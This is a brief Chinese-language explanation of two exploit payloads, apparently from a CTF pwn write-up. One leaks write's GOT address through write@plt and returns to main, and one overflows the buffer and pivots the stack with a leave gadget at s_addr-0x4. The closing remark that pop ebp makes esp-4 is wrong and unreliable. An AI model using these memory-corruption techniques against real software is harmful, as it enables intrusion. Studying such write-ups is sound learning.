exp简析

这里面可能有两个问题点

问题点1

第一个payload构造

payload = ''
payload += p32(write_plt)
payload += p32(main_addr)
#这个是我们写入的调用write函数的参数因此我们构造p32(1)，目的是调用write函数去打印write的got表（write函数的地址），又因为是32位程序，所以一次传入4字节因此构造成p32(4)
payload += p32(1)
payload += p32(write_got)
payload += p32(4)


构造完是这个样子的。

问题点2

最后一个payload构造

payload = ''
payload = "B"*0x18
payload += p32(s_addr-0x4)
payload += p32(leave_addr)


我们看到第三行这里s_addr-0x4

当进入一个函数的时候，程序执行

push eip+4
push ebp
mov ebp,esp


的指令来避免执行完函数后堆栈不平衡以及找不到之前的入口地址。

而压栈一次esp-4而ebp不变也就是pop ebp后会使esp-4，因此我们payload构造的时候要s_addr-4。
